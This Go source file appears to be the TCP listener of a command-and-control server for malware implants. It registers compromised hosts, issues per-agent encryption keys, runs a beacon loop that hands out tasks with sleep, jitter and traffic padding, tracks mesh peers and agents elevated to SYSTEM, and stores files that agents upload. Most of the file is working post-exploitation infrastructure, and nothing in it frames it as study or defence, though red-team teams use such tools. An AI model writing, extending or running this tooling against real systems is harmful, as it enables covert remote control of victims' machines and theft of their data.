package server

import (
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"strings"
	"time"
)

// tcpFrame reads/writes length-prefixed frames: [4 bytes LE length][payload]
func tcpWriteFrame(conn net.Conn, data []byte) error {
	hdr := make([]byte, 4)
	binary.LittleEndian.PutUint32(hdr, uint32(len(data)))
	if _, err := conn.Write(hdr); err != nil {
		return err
	}
	_, err := conn.Write(data)
	return err
}

func tcpReadFrame(conn net.Conn) ([]byte, error) {
	hdr := make([]byte, 4)
	if _, err := io.ReadFull(conn, hdr); err != nil {
		return nil, err
	}
	n := binary.LittleEndian.Uint32(hdr)
	if n == 0 || n > 32*1024*1024 {
		return nil, fmt.Errorf("invalid frame size %d", n)
	}
	buf := make([]byte, n)
	_, err := io.ReadFull(conn, buf)
	return buf, err
}

// tcpMsg wraps a typed message for the TCP protocol.
type tcpMsg struct {
	Type    string          `json:"t"`
	Payload json.RawMessage `json:"p"`
}

func (s *Server) StartTCPListener(ctx context.Context, port int) error {
	ln, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
	if err != nil {
		return fmt.Errorf("tcp listen :%d: %w", port, err)
	}
	s.printf("[*] TCP agent listener on :%d\n", port)
	go func() {
		<-ctx.Done()
		ln.Close()
	}()
	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				return
			}
			go s.handleTCPAgent(conn)
		}
	}()
	return nil
}

func (s *Server) handleTCPAgent(conn net.Conn) {
	defer conn.Close()
	remote := conn.RemoteAddr().String()
	ip := remote
	if idx := strings.LastIndex(ip, ":"); idx != -1 {
		ip = ip[:idx]
	}

	// ── 1. Register (plaintext) ────────────────────────────────────────
	conn.SetDeadline(time.Now().Add(30 * time.Second))
	frame, err := tcpReadFrame(conn)
	if err != nil {
		return
	}
	var msg tcpMsg
	if err := json.Unmarshal(frame, &msg); err != nil || msg.Type != "register" {
		return
	}
	var req registerRequest
	if err := json.Unmarshal(msg.Payload, &req); err != nil {
		return
	}

	agentID := newUUID()
	key, err := NewAESKey()
	if err != nil {
		return
	}

	transport := req.Transport
	if transport == "" {
		transport = "tcp"
	}
	sleepSec  := req.SleepSec
	jitterPct := req.JitterPct
	if sleepSec  <= 0 { sleepSec  = 5 }
	if jitterPct <  0 { jitterPct = 20 }

	agent := &Agent{
		ID:          agentID,
		Hostname:    req.Hostname,
		Username:    req.Username,
		OS:          req.OS,
		IP:          ip,
		PID:         req.PID,
		AESKey:      key,
		SleepSec:    sleepSec,
		JitterPct:   jitterPct,
		Transport:   transport,
		ProcessName: req.ProcessName,
	}
	if err := s.db.RegisterAgent(agent); err != nil {
		return
	}

	resp := registerResponse{
		AgentID:   agentID,
		AESKey:    base64.StdEncoding.EncodeToString(key),
		SleepSec:  sleepSec,
		JitterPct: jitterPct,
	}
	respJSON, _ := json.Marshal(tcpMsg{Type: "register_resp", Payload: mustJSON(resp)})
	if err := tcpWriteFrame(conn, respJSON); err != nil {
		return
	}
	s.printf("[+] TCP agent: %s  %s@%s  (%s)\n", agentID[:8], req.Username, req.Hostname, ip)
	BroadcastGUI("AGENT_CHECKIN", agentID, fmt.Sprintf("new tcp agent: %s@%s (%s)", req.Username, req.Hostname, ip))

	// ── 2. Beacon loop ─────────────────────────────────────────────────
	conn.SetDeadline(time.Time{}) // no global deadline; per-read below
	for {
		conn.SetDeadline(time.Now().Add(10 * time.Minute))
		frame, err := tcpReadFrame(conn)
		if err != nil {
			break
		}
		if err := json.Unmarshal(frame, &msg); err != nil {
			break
		}

		switch msg.Type {
		case "beacon":
			ag, dbErr := s.db.GetAgent(agentID)
			if dbErr != nil || !ag.Active {
				// Agent was deleted or killed — send KILL using the session key
				// (identical to the AES key stored in DB / ghost map) and close.
				killWires := []taskWire{{ID: 0, Type: "KILL", Args: ""}}
				pt, _ := json.Marshal(beaconResponse{Tasks: killWires})
				if enc, encErr := Seal(key, pt); encErr == nil {
					out, _ := json.Marshal(tcpMsg{Type: "tasks", Payload: json.RawMessage(`"` + base64.StdEncoding.EncodeToString(enc) + `"`)})
					tcpWriteFrame(conn, out) //nolint:errcheck
				}
				return
			}
			s.db.TouchAgent(agentID)
			tasks, _ := s.db.PendingTasks(agentID)

			var wires []taskWire
			for _, t := range tasks {
				tw := taskWire{ID: t.ID, Type: t.Type, Args: t.Args}
				if len(t.Payload) > 0 {
					tw.Payload = base64.StdEncoding.EncodeToString(t.Payload)
				}
				wires = append(wires, tw)
				s.db.MarkTaskFetched(t.ID)
			}
			var peers []peerWire
			for _, p := range s.getMeshPeers(agentID) {
				peers = append(peers, peerWire{Addr: p.Addr, Proto: p.Proto})
			}
			br := beaconResponse{Tasks: wires, Peers: peers}
			if DataJitterMax > 0 {
				b := make([]byte, DataJitterMax/2+1)
				rand.Read(b) //nolint:errcheck
				br.Padding = base64.StdEncoding.EncodeToString(b)[:DataJitterMax]
			}
			plain, _ := json.Marshal(br)
			enc, err := Seal(key, plain)
			if err != nil {
				break
			}
			out, _ := json.Marshal(tcpMsg{Type: "tasks", Payload: json.RawMessage(`"` + base64.StdEncoding.EncodeToString(enc) + `"`)})
			if err := tcpWriteFrame(conn, out); err != nil {
				return
			}

		case "result":
			enc, err := base64.StdEncoding.DecodeString(strings.Trim(string(msg.Payload), `"`))
			if err != nil {
				break
			}
			plain, err := Open(key, enc)
			if err != nil {
				break
			}
			var res resultRequest
			if err := json.Unmarshal(plain, &res); err != nil {
				break
			}
			s.db.InsertResult(res.TaskID, agentID, res.Output, res.Error)
			if res.IsAdmin {
				s.db.UpdateAgentAdmin(agentID, true)
				BroadcastGUI("AGENT_ADMIN", agentID, "elevated to SYSTEM")
			}
			go s.maybeRegisterMeshPeer(agentID, res.Output)
			if res.Output != "" {
				BroadcastGUI("TASK_RESULT", agentID, fmt.Sprintf("task #%d complete", res.TaskID))
			}
			if res.Error != "" {
				BroadcastGUI("TASK_RESULT", agentID, fmt.Sprintf("task #%d error: %s", res.TaskID, res.Error))
			}
			ack, _ := json.Marshal(tcpMsg{Type: "ack"})
			tcpWriteFrame(conn, ack) //nolint:errcheck

		case "upload":
			// file upload: payload is base64(encrypted JSON {task_id, filename, data_b64})
			enc, err := base64.StdEncoding.DecodeString(strings.Trim(string(msg.Payload), `"`))
			if err != nil {
				break
			}
			plain, err := Open(key, enc)
			if err != nil {
				break
			}
			var ureq struct {
				TaskID   int64  `json:"task_id"`
				Filename string `json:"filename"`
				Data     string `json:"data"` // base64
			}
			if err := json.Unmarshal(plain, &ureq); err != nil {
				break
			}
			fileData, _ := base64.StdEncoding.DecodeString(ureq.Data)
			dir := filepath.Join(s.cfg.DataDir, "uploads", agentID)
			os.MkdirAll(dir, 0700)
			os.WriteFile(filepath.Join(dir, filepath.Base(ureq.Filename)), fileData, 0600)
			s.printf("[%s] tcp upload: %s (%d bytes)\n", agentID[:8], ureq.Filename, len(fileData))
			go s.CheckAndPromptBH(agentID, filepath.Base(ureq.Filename), fileData)
			ack, _ := json.Marshal(tcpMsg{Type: "ack"})
			tcpWriteFrame(conn, ack) //nolint:errcheck

		default:
			// unknown message type, ignore
		}
	}

	s.db.KillAgent(agentID)
	BroadcastGUI("AGENT_DEAD", agentID, "tcp connection closed")
}

func mustJSON(v any) json.RawMessage {
	b, _ := json.Marshal(v)
	return b
}
